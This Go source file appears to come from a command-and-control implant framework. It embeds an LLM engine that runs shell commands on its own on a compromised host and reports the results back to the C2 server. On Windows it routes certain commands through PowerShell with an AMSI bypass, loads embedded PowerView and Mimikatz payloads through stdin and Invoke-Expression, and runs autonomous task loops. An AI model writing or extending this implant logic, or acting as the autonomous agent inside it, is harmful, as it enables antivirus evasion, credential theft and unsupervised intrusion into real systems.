//go:build llama_embed || llama_external || llama_selfextract
// +build llama_embed llama_external llama_selfextract

package llama

import (
	"context"
	"encoding/json"
	"fmt"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"github.com/r74tech/virga/internal/implant/logger"
	"github.com/r74tech/virga/internal/implant/memdb"
	"github.com/r74tech/virga/internal/implant/payloads"
	"github.com/r74tech/virga/internal/shared/protocol"
)

// memdbCommandExecutor implements CommandExecutor with memdb integration
// It uses the same PowerShell detection logic as SystemCommandExecutor
type memdbCommandExecutor struct {
	db              *memdb.DB
	payloadCommands map[string]bool
	payloads        []*PayloadCommandInfo
}

func (m *memdbCommandExecutor) Execute(command string) (string, int, error) {
	log := logger.Get()

	// Validate command
	if command == "" {
		return "Error: empty command", -1, fmt.Errorf("empty command")
	}

	// Sanitize command
	command = strings.TrimSpace(command)

	// Create command with timeout
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		// Check if this is a payload command (requires AMSI bypass + payload injection)
		isPayloadCmd := m.isPayloadCommand(command)
		// Check if this is a PowerShell command (starts with Get-, Set-, Invoke-, etc.)
		isPowerShellCmd := m.isPowerShellCommand(command)

		log.Debug("Command routing decision", map[string]interface{}{
			"command":       command,
			"is_payload":    isPayloadCmd,
			"is_powershell": isPowerShellCmd,
		})

		if isPayloadCmd {
			// Payload command (e.g., Get-NetUser) - use PowerShell wrapper with AMSI bypass + payloads
			cmd = m.buildPowerShellCommandWithPayloads(ctx, command)
		} else if isPowerShellCmd {
			// Regular PowerShell command (e.g., Get-Process) - execute via PowerShell directly
			cmd = exec.CommandContext(ctx, "powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", command)
		} else {
			// Regular Windows command (e.g., systeminfo) - execute via cmd
			cmd = exec.CommandContext(ctx, "cmd", "/C", command)
		}
	} else {
		cmd = exec.CommandContext(ctx, "sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()

	exitCode := 0
	if exitErr, ok := err.(*exec.ExitError); ok {
		exitCode = exitErr.ExitCode()
	} else if err != nil {
		exitCode = -1
	}

	log.Debug("memdbCommandExecutor executed command", map[string]interface{}{
		"command":    command,
		"exit_code":  exitCode,
		"output_len": len(output),
	})

	// Store command result in memdb if available
	if m.db != nil {
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		// Parse command to get base command and args
		args := strings.Fields(command)
		if len(args) > 0 {
			m.db.StoreCommandResult(args[0], args[1:], string(output), errStr, exitCode, "llama")
		}
	}

	return string(output), exitCode, err
}

// isPowerShellCommand checks if a command is a PowerShell cmdlet
func (m *memdbCommandExecutor) isPowerShellCommand(command string) bool {
	parts := strings.Fields(command)
	if len(parts) == 0 {
		return false
	}

	cmdName := parts[0]

	powerShellPrefixes := []string{
		"Get-", "Set-", "New-", "Remove-", "Add-", "Invoke-",
		"Start-", "Stop-", "Test-", "Enable-", "Disable-",
		"Show-", "Find-", "Clear-", "Update-", "Out-",
		"Export-", "Import-", "Select-", "Where-", "ForEach-",
		"Measure-", "Compare-", "Convert-", "Join-", "Split-",
	}

	for _, prefix := range powerShellPrefixes {
		if strings.HasPrefix(cmdName, prefix) {
			return true
		}
	}

	return false
}

// isPayloadCommand checks if a command is a registered payload command
func (m *memdbCommandExecutor) isPayloadCommand(command string) bool {
	if len(m.payloadCommands) == 0 {
		return false
	}

	// Split by semicolon to handle compound commands like "Import-Module PowerView; Get-NetUser"
	subCommands := strings.Split(command, ";")

	// Check each sub-command
	for _, subCmd := range subCommands {
		subCmd = strings.TrimSpace(subCmd)
		parts := strings.Fields(subCmd)
		if len(parts) == 0 {
			continue
		}

		cmdName := parts[0]
		if m.payloadCommands[cmdName] {
			return true
		}
	}

	return false
}

// removeRedundantImports removes Import-Module statements for embedded payloads
// since the payloads are already loaded in the script
func (m *memdbCommandExecutor) removeRedundantImports(command string) string {
	// Split by semicolon to handle compound commands
	subCommands := strings.Split(command, ";")
	var filtered []string

	for _, subCmd := range subCommands {
		subCmd = strings.TrimSpace(subCmd)
		if subCmd == "" {
			continue
		}

		// Check if this is an Import-Module command
		if strings.HasPrefix(subCmd, "Import-Module") {
			// Skip Import-Module commands for embedded payloads
			// Examples: "Import-Module PowerView", "Import-Module Mimikatz"
			continue
		}

		filtered = append(filtered, subCmd)
	}

	return strings.Join(filtered, "; ")
}

// buildPowerShellCommandWithPayloads builds a PowerShell command with AMSI bypass and all payloads loaded
func (m *memdbCommandExecutor) buildPowerShellCommandWithPayloads(ctx context.Context, command string) *exec.Cmd {
	var scriptParts []string

	// 1. AMSI bypass (executed first, before stdin)
	amsiBypass := payloads.GetPowerShellAmsiBypass()

	// 2. Load ALL embedded payloads (PowerView, Mimikatz, etc.)
	allPayloads := payloads.ListEmbeddedPayloads()
	for _, payload := range allPayloads {
		if payload.Type == "powershell" {
			scriptParts = append(scriptParts, string(payload.Content))
		}
	}

	// 3. Execute the actual command (remove Import-Module statements for embedded payloads)
	cleanedCommand := m.removeRedundantImports(command)
	scriptParts = append(scriptParts, cleanedCommand)

	// Combine payloads and command (without AMSI bypass)
	payloadScript := strings.Join(scriptParts, "\n")

	log := logger.Get()
	log.Debug("Payload script size", map[string]interface{}{
		"script_length": len(payloadScript),
		"command":       command,
		"has_amsi":      amsiBypass != "",
	})

	// Build command: Execute AMSI bypass first, then read and execute payload from stdin
	var psCommand string
	if amsiBypass != "" {
		// AMSI bypass inline, then execute stdin content
		psCommand = amsiBypass + "; [Console]::In.ReadToEnd() | Invoke-Expression"
	} else {
		// No AMSI bypass, just execute stdin
		psCommand = "[Console]::In.ReadToEnd() | Invoke-Expression"
	}

	cmd := exec.CommandContext(ctx, "powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", psCommand)
	cmd.Stdin = strings.NewReader(payloadScript)
	return cmd
}

// executeSystemCommandWithMemDB executes a system command and stores result in memdb
func (li *LlamaIntegration) executeSystemCommandWithMemDB(command string) CommandExecution {
	log := logger.Get()

	log.Debug("Llama executing system command with memdb", map[string]interface{}{
		"command":   command,
		"has_memdb": li.memdb != nil,
	})

	// Use memdb-aware executor if memdb is available
	if li.memdb != nil {
		// Build payload commands map
		payloadCommands := make(map[string]bool)
		var payloadInfos []*PayloadCommandInfo

		if li.engine != nil && li.engine.config.PayloadInfos != nil {
			payloadInfos = li.engine.config.PayloadInfos
			for _, payload := range payloadInfos {
				for _, cmd := range payload.Commands {
					payloadCommands[cmd.Name] = true
				}
			}
		}

		// Create memdb executor
		executor := &memdbCommandExecutor{
			db:              li.memdb,
			payloadCommands: payloadCommands,
			payloads:        payloadInfos,
		}

		output, exitCode, err := executor.Execute(command)

		log.LogLlamaCommand("", command, output, exitCode, err)

		cmdExec := CommandExecution{
			Command:  command,
			Output:   output,
			ExitCode: exitCode,
		}

		if err != nil {
			cmdExec.Error = err.Error()
		}

		return cmdExec
	}

	// Fall back to default executor
	return li.executeSystemCommand(command)
}

// handleSingleTaskWithMemDB handles single task with memdb integration
func (li *LlamaIntegration) handleSingleTaskWithMemDB(request protocol.Request) protocol.Response {
	var taskRequest struct {
		Type        string                 `json:"type"`
		Description string                 `json:"description"`
		Prompt      string                 `json:"prompt,omitempty"`
		Timeout     int                    `json:"timeout,omitempty"`
		Metadata    map[string]interface{} `json:"metadata,omitempty"`
	}

	if err := json.Unmarshal(request.Data, &taskRequest); err != nil {
		return protocol.Response{
			RequestID: request.ID,
			Status:    protocol.StatusError,
			Error:     "invalid task request",
		}
	}

	// Default timeout for single tasks (30 minutes)
	// TODO: Make this configurable from beacon.yaml
	timeout := 30 * time.Minute
	if taskRequest.Timeout > 0 {
		timeout = time.Duration(taskRequest.Timeout) * time.Second
	}

	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	task := &Task{
		ID:          request.ID,
		Type:        taskRequest.Type,
		Description: taskRequest.Description,
		Prompt:      taskRequest.Prompt,
		Metadata:    taskRequest.Metadata,
	}

	// Override command execution to use memdb-aware version
	li.engine.executeCommand = li.executeSystemCommandWithMemDB

	result, err := li.engine.ExecuteTask(ctx, task)

	// Store llama interaction in memdb
	if li.memdb != nil && taskRequest.Prompt != "" {
		var commands []string
		if result != nil && result.Commands != nil {
			for _, exec := range result.Commands {
				commands = append(commands, exec.Command)
			}
		}

		response := ""
		if result != nil {
			response = result.Output
		}

		li.memdb.StoreLlamaInteraction(
			request.ID,
			taskRequest.Prompt,
			response,
			taskRequest.Type,
			float32(li.engine.config.Temperature),
			commands,
		)
	}

	if err != nil {
		return protocol.Response{
			RequestID: request.ID,
			Status:    protocol.StatusError,
			Error:     err.Error(),
		}
	}

	data, _ := json.Marshal(result)
	return protocol.Response{
		RequestID: request.ID,
		Status:    protocol.StatusSuccess,
		Data:      data,
	}
}

// runAutonomousTasksWithMemDB runs autonomous tasks with memdb integration
func (li *LlamaIntegration) runAutonomousTasksWithMemDB(tasks []struct {
	Type        string `json:"type"`
	Description string `json:"description"`
}, reportInterval int,
) {
	log := logger.Get()

	if reportInterval == 0 {
		reportInterval = 300 // 5 minutes default
	}

	log.Info("Starting autonomous tasks with MemDB", map[string]interface{}{
		"task_count":      len(tasks),
		"report_interval": reportInterval,
		"engine_loaded":   li.engine != nil,
	})

	// Check if engine is initialized
	if li.engine == nil {
		log.Error("Llama engine is not initialized, cannot run tasks")
		return
	}

	for i, taskDef := range tasks {
		log.Info("Processing autonomous task", map[string]interface{}{
			"task_index":       i + 1,
			"total_tasks":      len(tasks),
			"task_type":        taskDef.Type,
			"task_description": taskDef.Description,
		})

		// Log task start
		log.Info(fmt.Sprintf("Llama task %d/%d starting: %s", i+1, len(tasks), taskDef.Type))

		// Create context with timeout (30 minutes for autonomous tasks)
		// TODO: Make this configurable from beacon.yaml
		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Minute)

		log.Debug("Creating context for autonomous task", map[string]interface{}{
			"task_index": i + 1,
			"task_type":  taskDef.Type,
		})

		task := &Task{
			ID:          fmt.Sprintf("auto_%s_%d", taskDef.Type, time.Now().UnixNano()),
			Type:        taskDef.Type,
			Description: taskDef.Description,
		}

		log.LogLlama("autonomous_task_start", map[string]interface{}{
			"task_id":     task.ID,
			"task_type":   task.Type,
			"task_index":  i + 1,
			"total_tasks": len(tasks),
		})

		// Use memdb-aware command executor
		li.engine.executeCommand = li.executeSystemCommandWithMemDB

		// Track task execution time
		taskStartTime := time.Now()
		log.Info("Starting autonomous task execution", map[string]interface{}{
			"task_id":   task.ID,
			"task_type": taskDef.Type,
		})

		result, err := li.engine.ExecuteTask(ctx, task)

		taskDuration := time.Since(taskStartTime)
		log.Info("Task execution finished", map[string]interface{}{
			"task_id":          task.ID,
			"duration_seconds": taskDuration.Seconds(),
		})

		// Log task result
		if err != nil {
			log.Error("Autonomous task failed", map[string]interface{}{
				"task_id":          task.ID,
				"task_type":        taskDef.Type,
				"error":            err.Error(),
				"duration_seconds": taskDuration.Seconds(),
			})
		}

		if result != nil {
			log.Info("Autonomous task completed", map[string]interface{}{
				"task_id":           task.ID,
				"task_type":         taskDef.Type,
				"commands_executed": len(result.Commands),
				"findings":          len(result.Findings),
				"output_length":     len(result.Output),
				"duration_seconds":  taskDuration.Seconds(),
				"had_error":         err != nil,
			})
		} else {
			log.Warn("Task returned nil result", map[string]interface{}{
				"task_id":   task.ID,
				"task_type": taskDef.Type,
				"had_error": err != nil,
			})
		}

		// Store llama interaction in memdb
		if li.memdb != nil {
			var commands []string
			if result != nil && result.Commands != nil {
				for _, exec := range result.Commands {
					commands = append(commands, exec.Command)
				}
			}

			prompt := fmt.Sprintf("Task: %s - %s", taskDef.Type, taskDef.Description)
			response := ""
			if result != nil {
				response = result.Output
			}

			log.Info("Storing Llama interaction in MemDB", map[string]interface{}{
				"task_id":       task.ID,
				"task_type":     taskDef.Type,
				"command_count": len(commands),
				"response_len":  len(response),
				"prompt":        prompt,
			})

			// Store the interaction
			li.memdb.StoreLlamaInteraction(
				task.ID,
				prompt,
				response,
				"llama_autonomous",
				float32(li.engine.config.Temperature),
				commands,
			)

			// Verify storage
			log.Info("Llama interaction stored in MemDB", map[string]interface{}{
				"task_id":         task.ID,
				"task_type":       taskDef.Type,
				"success":         true,
				"commands_stored": commands,
			})

			log.LogLlama("autonomous_task_stored", map[string]interface{}{
				"task_id": task.ID,
				"success": true,
			})
		} else {
			log.Warn("MemDB not available, skipping storage", map[string]interface{}{
				"task_id": task.ID,
			})
		}

		// Prepare report
		report := map[string]interface{}{
			"task":      task,
			"result":    result,
			"error":     "",
			"timestamp": time.Now().UTC(),
		}

		if err != nil {
			report["error"] = err.Error()
		}

		// Send report to C2
		li.sendReport(report)

		// Cancel context for this task to free resources
		if cancel != nil {
			cancel()
			log.Debug("Task context cancelled", map[string]interface{}{
				"task_id":    task.ID,
				"task_type":  taskDef.Type,
				"task_index": i + 1,
			})
		}

		// Wait before next task (but not after the last task)
		if i < len(tasks)-1 {
			log.Info("Waiting before next task", map[string]interface{}{
				"wait_seconds": reportInterval,
				"next_task":    i + 2,
				"total_tasks":  len(tasks),
			})
			time.Sleep(time.Duration(reportInterval) * time.Second)
		} else {
			log.Info("All autonomous tasks completed", map[string]interface{}{
				"total_tasks": len(tasks),
			})
		}
	}
}
